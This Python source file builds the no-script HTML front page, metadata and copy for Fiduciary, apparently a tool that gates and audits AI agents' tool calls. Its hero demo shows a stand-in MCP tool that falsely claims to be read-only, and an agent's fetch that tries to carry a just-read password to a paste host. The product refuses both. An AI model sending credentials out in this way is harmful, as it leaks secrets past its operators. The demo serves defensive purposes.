"""The public site's front page, as HTML a reader without a script can read (1.16.0; 1.18.0).

The front page is drawn by the console's script, so a crawler that runs no script, ``curl``
and a chat app's link preview used to see an empty page. :func:`page_parts` gives
:func:`fiduciary.report.html` three things for the site:

- the head: a description, the canonical address, Open Graph and Twitter card tags, a
  favicon, and structured data (``SoftwareApplication`` for Fiduciary, ``SoftwareSourceCode``
  for each package);
- the front page itself, written into ``<div id="app">`` with the classes the script uses,
  so the page looks the same before the script runs and the script replaces it in place;
- :data:`COPY`, the words on the front page, which the script reads from the payload. They
  are written here once, for both.

:func:`sitemap`, :func:`robots` and :func:`favicon` are the files ``scripts/build_site.py``
writes beside the page.
"""

from __future__ import annotations

import json
import re
from collections.abc import Iterable, Mapping
from html import escape
from typing import Any, Final

from fiduciary import brand

__all__ = ["COPY", "SITE_URL", "favicon", "page_parts", "robots", "sitemap"]

SITE_URL: Final = "https://crimsondevil0929.github.io/fiduciary/"
CARD: Final = "social-card.png"
"""The link preview's picture, 1200 by 630, beside the page (``scripts/make_social_card.py``)."""
REPO: Final = "https://github.com/crimsondevil0929/"
PYPI: Final = "https://pypi.org/project/"

TITLE: Final = "Fiduciary: agents change real systems, under signed limits"
DESCRIPTION: Final = (
    "Open-source Python that stages every change an AI agent makes, checks what it actually "
    "did against limits your team signed, and proves it offline."
)

COPY: Final[dict[str, Any]] = {
    "badge": {
        "version": "1.19",
        "text": "What leaves is checked: a credential your agent read cannot go out in a fetch",
        "href": REPO + "fiduciary/blob/main/CHANGELOG.md",
    },
    "headline": "Let AI agents change real systems. Keep only the changes you approved.",
    "lede": (
        "Your agent's rules live in its prompt, and prompts get trimmed. Fiduciary sits between "
        "the agent and its tools. It pins what each tool is, holds the dangerous calls for your "
        "passkey, keeps what the agent read from leaving, and puts back what a failed turn "
        "changed. Every decision is a signed record anyone can check offline."
    ),
    "demo": "Open the interactive demo",
    "workflows": "{workflows} workflows",
    "install": "pip install interlock-fiduciary",
    "fine": "Apache-2.0 · Python 3.11 to 3.14 · no cookies, no trackers",
    # The hero's terminal: lines scripts/record_hero.py printed, run on 1.19.0 against a
    # stand-in server it writes (its venv's python shown as "python"). Its delete_volume
    # claims readOnlyHint; its volume list carries a password. Lines are left out, never
    # changed: the first line of delete_volume's answer ("Committed: ... ran as plan ...",
    # the plan that queued the held request) and the deployment's path.
    "hero": {
        "file": "a protected MCP server",
        "mode": "enforcing",
        "label": "fiduciary protect on an MCP server, and an agent's calls through it",
        "lines": [
            ["cmd", "fiduciary protect --mcp-config .mcp.json --enforce --apply"],
            ["", "protected   infra (file-mcp): python infra_server.py"],
            ["", "            list_volumes: read"],
            ["", "            delete_volume: held"],
            [
                "hit",
                "              flagged: the server marks it read-only, but its name says "
                "delete and its description says delete",
            ],
            ["", "            fetch: read"],
            ["agent", 'delete_volume {"volume": "prod-db"}'],
            [
                "hit",
                "  Held for the principals' approval, not yet made: upstream delete_volume.",
            ],
            ["agent", 'fetch {"url": "https://paste.example/?q=Sup3rS3cretPw4"}'],
            ["hit", "  Not sent: it carries a credential this session read."],
            ["agent", 'fetch {"url": "https://status.example/"}'],
            ["", "  <html>ok</html>"],
        ],
        "caption": (
            "The server says delete_volume only reads; its name says otherwise, so it waits for "
            "a passkey. A fetch carrying a password the agent had just listed is refused. "
            "Recorded with a stand-in server; the agent's calls are marked >."
        ),
    },
    "doors": {
        "kicker": "Start where your agent is",
        "title": "Three ways in",
        "lede": (
            "Each one starts in shadow mode: nothing is refused until you have seen what would be."
        ),
        "items": [
            {
                "key": "clients",
                "tab": "I use Claude Code, Cursor or Claude Desktop",
                "text": (
                    "No code. Every MCP server in the client's file gets a proxy in front: its "
                    "tools pinned, its writes made once, a passkey for what needs approval, and a "
                    "fetch or send that carries what the agent read refused."
                ),
                "commands": [
                    "fiduciary protect --claude-desktop --apply",
                    "fiduciary protect --mcp-config .mcp.json --claude-code --apply",
                    "fiduciary passkey add",
                ],
                "code": [],
            },
            {
                "key": "python",
                "tab": "I build an agent in Python",
                "text": (
                    "Wrap a tool. Its change is staged, measured and checked before it is final, "
                    "and a committed one can be put back exactly with fiduciary undo."
                ),
                "commands": [
                    "fiduciary init --solo --shadow --substrate rest "
                    "--server https://api.example.com --resource refunds=/refunds",
                    "fiduciary undo <plan>",
                ],
                "code": [
                    "import fiduciary",
                    "",
                    "gov = fiduciary.open()  # the deployment fiduciary init wrote",
                    "",
                    "",
                    "@gov.tool",
                    "def refund(api: fiduciary.Rest, order_id: str, amount: str) -> str:",
                    '    """Refund part of an order."""',
                    '    api.create("refunds", {"order_id": order_id, "amount": amount})',
                    '    return f"refund of {amount} on {order_id} staged"',
                ],
            },
            {
                "key": "ci",
                "tab": "My agents run in CI or on infrastructure",
                "text": (
                    "Point it at the system itself: a Terraform configuration's plan, a "
                    "Kubernetes namespace's dry run. An agent in a CI job that reads an MCP "
                    "client file is protected the same way."
                ),
                "commands": [
                    "fiduciary init --solo --shadow --substrate terraform --directory infra",
                    "fiduciary init --solo --shadow --substrate kubernetes "
                    "--server https://k8s.example:6443 --namespace prod",
                    "fiduciary protect --mcp-config .mcp.json --apply",
                ],
                "code": [],
            },
        ],
    },
    "systems_order": [
        ["MCP servers", "R", ""],
        ["REST APIs", "", "REST API"],
        ["Git", "", "Git"],
        ["Files", "", "Files"],
        ["Kubernetes and Terraform", "", "Kubernetes"],
        ["FHIR", "", "FHIR R4"],
        ["SQL databases", "", "SQLite"],
    ],
    "systems": "One engine, measured on",
    "stack": {
        "kicker": "What you install",
        "title": "Fiduciary, and the two engines under it",
        "lede": (
            "A gateway decides whether an agent may call a tool. Fiduciary decides whether what "
            "the call changed may be kept, and leaves evidence for someone who trusts neither the "
            "agent nor the operator. Installing interlock-fiduciary brings both engines with it: "
            "Interlock stages and measures each change, and AgentGov keeps the budgets. Each "
            "also works on its own."
        ),
    },
    "packages": [
        {
            "key": "fiduciary",
            "name": "Fiduciary",
            "dist": "interlock-fiduciary",
            "layer": "The product",
            "role": "Signed limits, approvals and offline proof",
            "text": (
                "Your limits are a mandate that named people sign, and anything outside it needs "
                "two of three of them. Every decision is a signed record, and the records export "
                "as a bundle anyone can verify offline."
            ),
            "points": [
                "Pins the MCP servers your client runs: fiduciary protect",
                "Keeps what the agent read from leaving, whole or encoded",
                "Approvals signed with a passkey the agent cannot reach",
                "Puts a committed change back exactly: fiduciary undo",
                "Shadow mode first: see what it would have refused",
            ],
        },
        {
            "key": "interlock",
            "name": "Interlock",
            "dist": "interlock-escrow",
            "layer": "Engine · staging",
            "role": "Checks on what a write actually changed",
            "text": (
                "Each change is staged where nothing is final yet, measured, and checked. It "
                "commits once, on the exact state that was measured, or not at all."
            ),
            "points": [
                "SQL, Git, directories, Kubernetes, FHIR and REST APIs",
                "Every row, file or object a change touched, triggers and hooks included",
                "Outbound calls delivered once, after the commit",
            ],
        },
        {
            "key": "agentgov",
            "name": "AgentGov",
            "dist": "interlock-agentgov",
            "layer": "Engine · budgets",
            "role": "Spend and rate limits for agents",
            "text": (
                "A ledger for every scope in a delegation tree. A plan is held against its "
                "budget before it runs and settled after, so a sub-agent cannot spend more than "
                "its parent gave it."
            ),
            "points": [
                "Budgets, rate windows and circuit breakers",
                "ARC1 receipts: what each action was allowed, did and cost",
                "Reconciles a system's own log against the ledger",
            ],
        },
    ],
    "flow": [
        "agent tool call",
        "mandate",
        "stage, measure, check",
        "charge",
        "commit once, or refuse",
    ],
    "loop": {
        "kicker": "How it works",
        "title": "One loop, on every system",
        "lede": (
            "The same five steps run whether the agent edits a table, a repository, a cluster or "
            "a patient's chart. Only the way a change is measured differs."
        ),
        "steps": [
            [
                "Stage",
                "The tool call becomes a plan and runs where nothing is final yet: a SQL "
                "transaction, a Git worktree, a private copy of a directory, a Kubernetes dry "
                "run, or a prediction for an API.",
            ],
            [
                "Measure",
                "The stage records what the change actually did, down to every row, file, "
                "object or record, including whatever triggers, hooks and admission webhooks "
                "added on top.",
            ],
            [
                "Check",
                "The measured change is compared with the mandate: what it touched and how much, "
                "whose data it reached, how far any guarded value moved, the rate limits and "
                "budgets, and what the agent had read before it asked.",
            ],
            [
                "Commit or undo",
                "A change that passes commits once, on the exact version that was measured. A "
                "change that fails never commits. If an API changes more than predicted, the "
                "write is undone. A committed plan can be put back later, exactly as it was.",
            ],
            [
                "Prove",
                "Every decision is a signed record. An auditor runs all fourteen checks (V1 to "
                "V14) on an exported bundle, offline, with public keys you gave them separately. "
                "They need no access to your systems.",
            ],
        ],
        "fork": [
            "Outside the mandate?",
            "It can still go ahead if two of three named principals sign a warrant for that "
            "exact change.",
        ],
    },
    "ladder": {
        "kicker": "The measurement ladder",
        "title": "How much is known before a change is final",
        "lede": (
            "A database transaction shows every row before commit. An API can only be predicted, "
            "then read back. Each system is placed on the highest rung it supports, and every "
            "receipt says which rung measured it."
        ),
        "everywhere": "Every workflow, for its outbound requests",
        "none": "Not in this run",
    },
    "numbers": {
        "stats": [
            ["{workflows}", "workflows", "on {systems} kinds of system, in one run"],
            ["{refused}", "plans refused", "each one allowed by the gateway first"],
            [
                "{bundles}",
                "bundles verified offline",
                "{named} report an action taken outside a warrant",
            ],
            [
                "{passed} of {cases}",
                "acceptance cases",
                "live models on {domains} unrelated domains",
            ],
        ],
        "counted": "Counted from the run this page was built from: {mode}.",
        "how": "Which check stopped which plan →",
    },
    "closing": {
        "title": "Watch it refuse a change. Then check the proof yourself.",
        "text": (
            "The demo replays a real model's recorded session on this release. Each workflow "
            "ends with two audit bundles, and this page verifies them in your browser."
        ),
        "demo": "Open the interactive demo",
        "verify": "Verify a bundle",
    },
    "footer": {
        "text": (
            "Open source, Apache-2.0. This page is built from the repository with fiduciary demo "
            "--replay, and SHA256SUMS lists the SHA-256 of the page and of every bundle it links."
        ),
        "guides": [
            ["Secure MCP servers", "protect/"],
            ["Claude Code and Cursor", "claude-code/"],
            ["Stop data leaving", "outbound/"],
            ["Passkeys for approvals", "passkeys/"],
            ["Verify an audit bundle", "verify/"],
        ],
        "read": [
            ["Quickstart", REPO + "fiduciary/blob/main/docs/QUICKSTART.md"],
            ["Threat model", REPO + "fiduciary/blob/main/docs/THREAT_MODEL.md"],
            ["Specification", REPO + "fiduciary/blob/main/docs/FIDUCIARY_SPEC.md"],
            ["Changelog", REPO + "fiduciary/blob/main/CHANGELOG.md"],
        ],
        "note": "Signed records make tampering visible. They do not prevent it.",
    },
}
"""Every word on the front page. ``console.js`` draws the page from this (``SITE.copy``), and
:func:`page_parts` writes the same page as HTML; ``{name}`` is a count filled in from the run.
``tests/test_prose.py`` holds these strings to ``docs/STYLE.md``."""

NAV: Final = (
    ("home", "Overview"),
    ("run", "Interactive demo"),
    ("sandbox", "Live sandbox"),
    ("verify", "Verify a bundle"),
)
"""The site's views, as the script's top bar lists them."""

_ICONS: Final = {
    "layers": "M8 1 1 4.5 8 8l7-3.5L8 1Zm-5.6 6.2L1 8l7 3.5L15 8l-1.4-.8L8 10 2.4 7.2Zm0 3.5L1 "
    "11.5 8 15l7-3.5-1.4-.8L8 13.5l-5.6-2.8Z",
    "gate": "M2 2h3v12H2V2Zm9 0h3v12h-3V2ZM6 6h4v1.5H6V6Zm0 3h4v1.5H6V9Z",
    "shield": "M8 1.5 2.5 3.6v4.1c0 3.2 2.3 6 5.5 6.8 3.2-.8 5.5-3.6 5.5-6.8V3.6L8 1.5Zm-1 9.3L4.6 "
    "8.4l1-1 1.4 1.4 3.4-3.4 1 1L7 10.8Z",
    "check": "M6.3 11.6 2.7 8l1.1-1.1 2.5 2.5 5.9-5.9 1.1 1.1-7 7Z",
    "key": "M10.5 1a4.5 4.5 0 0 0-4.3 5.8L1 12v3h3v-1.5h1.5V12H7l1.2-1.2A4.5 4.5 0 1 0 10.5 1Zm1 "
    "2.5a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3Z",
    "copy": "M5 1h8a1 1 0 0 1 1 1v9h-1.5V2.5H5V1ZM2 4h8a1 1 0 0 1 1 1v9a1 1 0 0 1-1 1H2a1 1 0 0 "
    "1-1-1V5a1 1 0 0 1 1-1Zm.5 1.5v8h7v-8h-7Z",
    "ext": "M9 2h5v5h-1.5V4.6L7.1 10 6 8.9l5.4-5.4H9V2ZM2 4h5v1.5H3.5v7h7V9H12v5H2V4Z",
    "sun": "M8 4.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7ZM7.3 0h1.4v2.5H7.3V0Zm0 13.5h1.4V16H7.3v-2."
    "5ZM0 7.3h2.5v1.4H0V7.3Zm13.5 0H16v1.4h-2.5V7.3Z",
}
"""The icons the front page uses, the same paths as ``console.js``'s ``icon()``."""
_STEP_ICONS: Final = ("layers", "gate", "shield", "check", "key")
_RUNGS: Final = {"T": "transactional", "P": "plan-bound", "V": "predicted", "R": "request-only"}
_PYTHON: Final = re.compile(
    r"(#.*$)|(\"\"\"[^\"]*\"\"\"|\"(?:[^\"\\]|\\.)*\"|'(?:[^'\\]|\\.)*')|(@[\w.]+)"
    r"|\b(import|from|def|return|class|with|as|None|True|False)\b|\b(str|int|bool)\b"
)
"""``console.js``'s ``pyLine()``: comments, strings, decorators, keywords, builtins."""


# -- a little HTML ----------------------------------------------------------------------------


def _e(text: object) -> str:
    return escape(str(text), quote=True)


def _attrs(attrs: Mapping[str, str]) -> str:
    return "".join(f' {key}="{_e(value)}"' for key, value in attrs.items())


def _icon(name: str, size: int = 16) -> str:
    return (
        f'<svg width="{size}" height="{size}" viewBox="0 0 16 16" aria-hidden="true">'
        f'<path d="{_ICONS[name]}" fill="currentColor"></path></svg>'
    )


class _Marks:
    """Each mark with ids of its own, as ``console.js``'s ``mark()`` draws them."""

    def __init__(self) -> None:
        self._n = 0

    def __call__(self, name: str, size: int) -> str:
        self._n += 1
        svg = brand.inline(name, f"s{self._n}-")
        return f'<span class="mk-wrap" style="width:{size}px;height:{size}px">{svg}</span>'


def _fill(text: str, values: Mapping[str, object]) -> str:
    return re.sub(r"\{(\w+)\}", lambda m: str(values.get(m.group(1), m.group(0))), text)


def _python(line: str) -> str:
    """One line of the example, highlighted as ``console.js``'s ``pyLine()`` does."""
    out, at = "", 0
    for found in _PYTHON.finditer(line):
        groups = found.groups()
        kind = "csdkb"[next(i for i, g in enumerate(groups) if g is not None)]
        out += _e(line[at : found.start()]) + f'<span class="py-{kind}">{_e(found[0])}</span>'
        at = found.end()
    return out + _e(line[at:])


def _copy_chip(command: str) -> str:
    return (
        f'<button class="lp-copy" title="Copy: {_e(command)}" aria-label="Copy {_e(command)}">'
        f'<span class="lp-prompt" aria-hidden="true">$</span><code>{_e(command)}</code>'
        f"{_icon('copy')}</button>"
    )


def _rung(letter: str) -> str:
    return f'<span class="rung" title="{_RUNGS.get(letter, "")} measurement">{_e(letter)}</span>'


def _head(x: Mapping[str, str]) -> str:
    return (
        f'<header class="lp-head"><span class="lp-kicker">{_e(x["kicker"])}</span>'
        f"<h2>{_e(x['title'])}</h2><p>{_e(x['lede'])}</p></header>"
    )


def _section(cls: str, ident: str | None, inner: str) -> str:
    attr = f' id="{ident}"' if ident else ""
    return f'<section class="{cls}"{attr}><div class="wrap">{inner}</div></section>'


# -- what the run counted ---------------------------------------------------------------------


def _ran(data: Mapping[str, Any]) -> list[Mapping[str, Any]]:
    return [r for r in (data.get("overview") or {}).get("industries", []) if r.get("ran")]


def counts(data: Mapping[str, Any]) -> dict[str, object]:
    """The numbers the front page fills its words with, counted as ``console.js``'s
    ``totals()`` and ``modeShort()`` count them."""
    ran = _ran(data)
    systems = list(dict.fromkeys(r["substrate"] for r in ran if r.get("substrate")))
    acceptance = (data.get("overview") or {}).get("acceptance") or {}
    demo = data.get("demo") or {}
    served = (demo.get("model") or {}).get("served")
    mode = (
        f"a recorded {served} session, replayed with no model called"
        if demo.get("mode") == "replay" and served
        else f"live {served} session"
        if demo.get("mode") == "live" and served
        else "scripted calls, no model"
    )
    return {
        "workflows": len(ran),
        "systems": len(systems),
        "refused": sum(int((r.get("engine") or {}).get("refused_plans", 0)) for r in ran),
        "bundles": len(ran) * 2,
        "named": sum(1 for r in ran if (r.get("after") or {}).get("exit_code") == 7),
        "passed": acceptance.get("passed", 0),
        "cases": acceptance.get("cases", 0),
        "domains": len(acceptance.get("domains", [])),
        "mode": mode,
    }


def _versions(data: Mapping[str, Any]) -> dict[str, str]:
    attestation = (data.get("attestations") or {}).get(data.get("primary")) or {}
    verifier = attestation.get("verifier") or {}
    return {k: str(verifier[k]) for k in ("agentgov", "interlock", "fiduciary") if verifier.get(k)}


# -- the front page, as the script draws it ----------------------------------------------------


def _topbar(mark: _Marks) -> str:
    current = ' aria-current="page"'
    nav = "".join(
        f'<a href="#/{key}"{current if key == "home" else ""}>{_e(label)}</a>' for key, label in NAV
    )
    return (
        '<header class="top site"><div class="wrap">'
        f'<a class="brand" href="#/home">{mark("fiduciary", 22)}<span>Fiduciary</span></a>'
        f'<nav class="views noprint" aria-label="Views">{nav}</nav><div class="spacer"></div>'
        '<div class="top-links noprint">'
        f'<a href="{REPO}fiduciary" rel="noopener">GitHub{_icon("ext", 12)}</a>'
        f'<a href="{PYPI}interlock-fiduciary/" rel="noopener">PyPI{_icon("ext", 12)}</a></div>'
        '<button class="btn icon noprint" title="Light or dark" aria-label="Switch theme">'
        f"{_icon('sun')}</button></div></header>"
    )


def _hero(c: Mapping[str, Any], n: Mapping[str, object], rows: list[Mapping[str, Any]]) -> str:
    b = c["badge"]
    copy = (
        '<div class="lp-hero-copy">'
        f'<a class="lp-badge" href="{_e(b["href"])}" rel="noopener"><b>{_e(b["version"])}</b>'
        f'{_e(b["text"])}<span aria-hidden="true">→</span></a>'
        f"<h1>{_e(c['headline'])}</h1>"
        f'<p class="lp-lede">{_e(c["lede"])}</p>'
        f'<div class="lp-cta"><a class="lp-btn primary" href="#/run">{_e(c["demo"])}'
        f'<span class="lp-count">{_e(_fill(c["workflows"], n))}</span></a>'
        f"{_copy_chip(c['install'])}</div>"
        f'<p class="lp-fine">{_e(c["fine"])}</p></div>'
    )
    hx = c["hero"]
    shown = "".join(_term_line(kind, text) for kind, text in hx["lines"])
    code = (
        f'<figure class="lp-code lp-terminal" aria-label="{_e(hx["label"])}">'
        '<div class="lp-code-bar"><i></i><i></i><i></i>'
        f'<span class="mono">{_e(hx["file"])}</span><span class="spacer"></span>'
        f'<span class="lp-tag">{_e(hx["mode"])}</span></div>'
        f'<div class="lp-term">{shown}</div><figcaption>{_e(hx["caption"])}</figcaption></figure>'
    )
    classes: dict[str, str] = {}
    for row in rows:
        classes.setdefault(str(row.get("substrate") or ""), str(row.get("class") or ""))
    chips = "".join(
        f'<span class="lp-sys">{_rung(letter or classes[found])}{_e(name)}</span>'
        for name, letter, found in c["systems_order"]
        if letter or found in classes
    )
    systems = (
        f'<div class="lp-systems"><span class="lp-sys-label">{_e(c["systems"])}</span>{chips}</div>'
        if chips
        else ""
    )
    return _section("lp-hero", None, f'<div class="lp-hero-grid">{copy}{code}</div>{systems}')


def _term_line(kind: str, text: str) -> str:
    """One line of a terminal figure: a command, an agent's call, or what was printed."""
    if kind == "cmd":
        return f'<div class="tl"><span class="lp-prompt">$</span> {_e(text)}</div>'
    if kind == "agent":
        return f'<div class="tl lp-agent"><span class="lp-prompt">&gt;</span> {_e(text)}</div>'
    return f'<div class="tl{" hit" if kind == "hit" else ""}">{_e(text)}</div>'


def _doors(c: Mapping[str, Any]) -> str:
    """The three ways in, as tabs; before the script runs, the first is shown."""
    d = c["doors"]
    tabs = "".join(
        f'<button class="lp-door-tab" role="tab" id="door-{_e(x["key"])}" '
        f'aria-controls="door-panel-{_e(x["key"])}" '
        f'aria-selected="{"true" if i == 0 else "false"}">{_e(x["tab"])}</button>'
        for i, x in enumerate(d["items"])
    )
    panels = ""
    for i, x in enumerate(d["items"]):
        chips = "".join(_copy_chip(command) for command in x["commands"])
        lines = "".join(
            f'<div class="cl"><span class="ln" aria-hidden="true">{n}</span>'
            f"<span>{_python(line)}</span></div>"
            for n, line in enumerate(x["code"], 1)
        )
        code = f'<pre class="lp-src lp-door-code">{lines}</pre>' if x["code"] else ""
        hidden = "" if i == 0 else " hidden"
        panels += (
            f'<div class="lp-door" role="tabpanel" id="door-panel-{_e(x["key"])}" '
            f'aria-labelledby="door-{_e(x["key"])}"{hidden}>'
            f'<p>{_e(x["text"])}</p><div class="lp-door-cmds">{chips}</div>{code}</div>'
        )
    return _section(
        "lp-sec lp-doors",
        "doors",
        f'{_head(d)}<div class="lp-door-tabs" role="tablist">{tabs}</div>{panels}',
    )


def _stack(c: Mapping[str, Any], versions: Mapping[str, str], mark: _Marks) -> str:
    cards = ""
    for p in c["packages"]:
        version = versions.get(p["key"])
        points = "".join(f"<li>{_e(x)}</li>" for x in p["points"])
        cards += (
            f'<article class="lp-card lp-pkg lp-{p["key"]}"><div class="lp-pkg-head">'
            f'{mark(p["key"], 44)}<div><div class="lp-layer">{_e(p["layer"])}</div>'
            f"<h3>{_e(p['name'])}</h3></div>"
            + (f'<span class="lp-ver mono">v{_e(version)}</span>' if version else "")
            + f'</div><p class="lp-role">{_e(p["role"])}</p><p class="lp-text">{_e(p["text"])}</p>'
            f'<ul class="lp-points">{points}</ul><div class="lp-pkg-foot">'
            f'{_copy_chip("pip install " + p["dist"])}<div class="lp-links">'
            f'<a href="{REPO}{p["key"]}" rel="noopener">GitHub</a>'
            f'<a href="{PYPI}{p["dist"]}/" rel="noopener">PyPI</a></div></div></article>'
        )
    f = [_e(x) for x in c["flow"]]
    flow = (
        f"<span>{f[0]}</span><i></i>"
        f'<span class="lp-fiduciary">{mark("fiduciary", 16)}{f[1]}</span><i></i>'
        f'<span class="lp-interlock">{mark("interlock", 16)}{f[2]}</span><i></i>'
        f'<span class="lp-agentgov">{mark("agentgov", 16)}{f[3]}</span><i></i>'
        f"<span>{f[4]}</span>"
    )
    return _section(
        "lp-sec",
        "stack",
        f'{_head(c["stack"])}<div class="lp-cards">{cards}</div>'
        f'<div class="lp-flow" aria-hidden="true">{flow}</div>',
    )


def _loop(c: Mapping[str, Any]) -> str:
    loop, steps = c["loop"], ""
    last = len(c["loop"]["steps"]) - 1
    for i, (title, text) in enumerate(loop["steps"]):
        fork = (
            f'<div class="lp-fork"><b>{_e(loop["fork"][0])}</b> {_e(loop["fork"][1])}</div>'
            if i == 2
            else ""
        )
        steps += (
            f'<li class="lp-step{" end" if i == last else ""}">'
            f'<div class="lp-node"><span>{i + 1}</span></div><div class="lp-step-body">'
            f'<div class="lp-step-icon">{_icon(_STEP_ICONS[i], 18)}</div>'
            f"<h3>{_e(title)}</h3><p>{_e(text)}</p>{fork}</div></li>"
        )
    return _section("lp-sec lp-alt", "loop", f'{_head(loop)}<ol class="lp-steps">{steps}</ol>')


def _ladder(c: Mapping[str, Any], data: Mapping[str, Any]) -> str:
    overview = data.get("overview") or {}
    if not overview:
        return ""
    strength = {"T": 4, "P": 3, "V": 2, "R": 1}
    words, cards = c["ladder"], ""
    for rung in overview.get("ladder", []):
        letter, name = rung["class"], str(rung["name"])
        k = strength.get(letter, 0)
        here = [
            r for r in overview.get("industries", []) if r.get("class") == letter and r.get("ran")
        ]
        links = (
            f"<span>{_e(words['everywhere'])}</span>"
            if letter == "R"
            else "".join(
                f'<a href="#/run/{_e(r["key"])}">{_e(r.get("workflow") or r["industry"])}</a>'
                for r in here
            )
            or f'<span class="muted">{_e(words["none"])}</span>'
        )
        meter = "".join(f'<i class="{"on" if i <= k else ""}"></i>' for i in range(1, 5))
        cards += (
            f'<article class="lp-card lp-rung"><div class="lp-rung-head">'
            f'<span class="lp-letter">{_e(letter)}</span><div><h3>{_e(name[:1].upper() + name[1:])}'
            f'</h3><div class="lp-meter" title="{k} of 4">{meter}</div></div></div>'
            f'<p>{_e(rung["promise"])}</p><p class="lp-where">{_e(rung["where"])}</p>'
            f'<div class="lp-here">{links}</div></article>'
        )
    return _section("lp-sec", "ladder", f'{_head(words)}<div class="lp-rungs">{cards}</div>')


def _numbers(c: Mapping[str, Any], n: Mapping[str, object]) -> str:
    if not n.get("workflows"):
        return ""
    words = c["numbers"]
    stats = "".join(
        f'<div class="lp-stat"><b class="tnum">{_e(_fill(value, n))}</b>'
        f"<span>{_e(_fill(label, n))}</span><small>{_e(_fill(note, n))}</small></div>"
        for value, label, note in words["stats"]
    )
    return _section(
        "lp-sec lp-numbers",
        None,
        f'<div class="lp-stats">{stats}</div><p class="lp-stats-note">'
        f'{_e(_fill(words["counted"], n))} <a href="#/how">{_e(words["how"])}</a></p>',
    )


def _closing(c: Mapping[str, Any], mark: _Marks) -> str:
    x = c["closing"]
    marks = "".join(mark(name, 40) for name in brand.NAMES)
    return _section(
        "lp-close",
        None,
        f'<div class="lp-close-card"><div class="lp-close-marks" aria-hidden="true">{marks}</div>'
        f"<h2>{_e(x['title'])}</h2><p>{_e(x['text'])}</p>"
        f'<div class="lp-cta center"><a class="lp-btn primary" href="#/run">{_e(x["demo"])}</a>'
        f'<a class="lp-btn" href="#/verify">{_e(x["verify"])}</a></div></div>',
    )


def _footer(c: Mapping[str, Any], mark: _Marks) -> str:
    def col(title: str, links: Iterable[tuple[str, str]]) -> str:
        found = "".join(
            f'<a href="{_e(href)}" rel="noopener">{_e(text)}</a>' for text, href in links
        )
        return f'<div class="lp-fcol"><b>{_e(title)}</b>{found}</div>'

    packages, foot = c["packages"], c["footer"]
    marks = "".join(mark(name, 22) for name in brand.NAMES)
    return (
        '<footer class="lp-foot"><div class="wrap"><div class="lp-foot-grid">'
        f'<div class="lp-foot-brand"><div class="lp-foot-marks">{marks}</div>'
        f"<p>{_e(foot['text'])}</p></div>"
        + col("Source", [(p["name"], REPO + p["key"]) for p in packages])
        + col("Install", [(p["dist"], f"{PYPI}{p['dist']}/") for p in packages])
        + col("Guides", [(text, href) for text, href in foot["guides"]])
        + col("Read", [(text, href) for text, href in foot["read"]])
        + f'</div><p class="lp-foot-note">{_e(foot["note"])}</p></div></footer>'
    )


def front_page(data: Mapping[str, Any]) -> str:
    """The front page as the script draws it on load, for a reader that runs no script."""
    n, mark = counts(data), _Marks()
    main = (
        _hero(COPY, n, _ran(data))
        + _doors(COPY)
        + _stack(COPY, _versions(data), mark)
        + _loop(COPY)
        + _ladder(COPY, data)
        + _numbers(COPY, n)
        + _closing(COPY, mark)
    )
    return "\n".join(
        [_topbar(mark), f'<main id="home" class="lp">{main}</main>', _footer(COPY, mark)]
    )


# -- the head, and the files beside the page -----------------------------------------------


def _structured(data: Mapping[str, Any]) -> dict[str, Any]:
    versions = _versions(data)
    image = SITE_URL + CARD
    packages = [
        {
            "@type": "SoftwareSourceCode",
            "@id": f"{REPO}{p['key']}#code",
            "name": p["name"],
            "description": f"{p['role']}. {p['text']}",
            "codeRepository": REPO + p["key"],
            "programmingLanguage": "Python",
            "license": "https://www.apache.org/licenses/LICENSE-2.0",
            "url": f"{PYPI}{p['dist']}/",
            **({"version": versions[p["key"]]} if p["key"] in versions else {}),
        }
        for p in COPY["packages"]
    ]
    return {
        "@context": "https://schema.org",
        "@graph": [
            {"@type": "WebSite", "@id": SITE_URL + "#site", "name": "Fiduciary", "url": SITE_URL},
            {
                "@type": "SoftwareApplication",
                "@id": SITE_URL + "#app",
                "name": "Fiduciary",
                "alternateName": "interlock-fiduciary",
                "description": DESCRIPTION,
                "url": SITE_URL,
                "image": image,
                "applicationCategory": "DeveloperApplication",
                "operatingSystem": "Linux, macOS",
                "softwareRequirements": "Python 3.11 to 3.14",
                "license": "https://www.apache.org/licenses/LICENSE-2.0",
                "downloadUrl": PYPI + "interlock-fiduciary/",
                "installUrl": PYPI + "interlock-fiduciary/",
                "offers": {"@type": "Offer", "price": "0", "priceCurrency": "USD"},
                "sameAs": [REPO + "fiduciary", PYPI + "interlock-fiduciary/"],
                **({"softwareVersion": versions["fiduciary"]} if "fiduciary" in versions else {}),
                "hasPart": [{"@id": p["@id"]} for p in packages],
            },
            *packages,
        ],
    }


def head(data: Mapping[str, Any]) -> str:
    """The site's ``<head>`` tags beyond the title: for search engines and link previews."""
    image = SITE_URL + CARD
    alt = "The AgentGov, Interlock and Fiduciary marks, under the line: " + COPY["headline"]
    tags = [
        ("meta", {"name": "description", "content": DESCRIPTION}),
        ("link", {"rel": "canonical", "href": SITE_URL}),
        ("link", {"rel": "icon", "type": "image/svg+xml", "href": "favicon.svg"}),
        ("meta", {"property": "og:type", "content": "website"}),
        ("meta", {"property": "og:site_name", "content": "Fiduciary"}),
        ("meta", {"property": "og:title", "content": TITLE}),
        ("meta", {"property": "og:description", "content": DESCRIPTION}),
        ("meta", {"property": "og:url", "content": SITE_URL}),
        ("meta", {"property": "og:image", "content": image}),
        ("meta", {"property": "og:image:type", "content": "image/png"}),
        ("meta", {"property": "og:image:width", "content": "1200"}),
        ("meta", {"property": "og:image:height", "content": "630"}),
        ("meta", {"property": "og:image:alt", "content": alt}),
        ("meta", {"name": "twitter:card", "content": "summary_large_image"}),
        ("meta", {"name": "twitter:title", "content": TITLE}),
        ("meta", {"name": "twitter:description", "content": DESCRIPTION}),
        ("meta", {"name": "twitter:image", "content": image}),
        ("meta", {"name": "twitter:image:alt", "content": alt}),
    ]
    structured = json.dumps(_structured(data), indent=1, ensure_ascii=False)
    structured = structured.replace("<", "\\u003c").replace(">", "\\u003e").replace("&", "\\u0026")
    return "\n".join(
        [f"<{tag}{_attrs(attrs)}>" for tag, attrs in tags]
        + [f'<script type="application/ld+json">\n{structured}\n</script>']
    )


def page_parts(data: Mapping[str, Any]) -> tuple[str, str]:
    """``(head, body)``: the tags :func:`fiduciary.report.html` puts in the site's head, and
    the front page it puts in ``<div id="app">``."""
    return head(data), front_page(data)


def built_on(data: Mapping[str, Any]) -> str:
    """The day the run behind the page was verified, as ``YYYY-MM-DD``."""
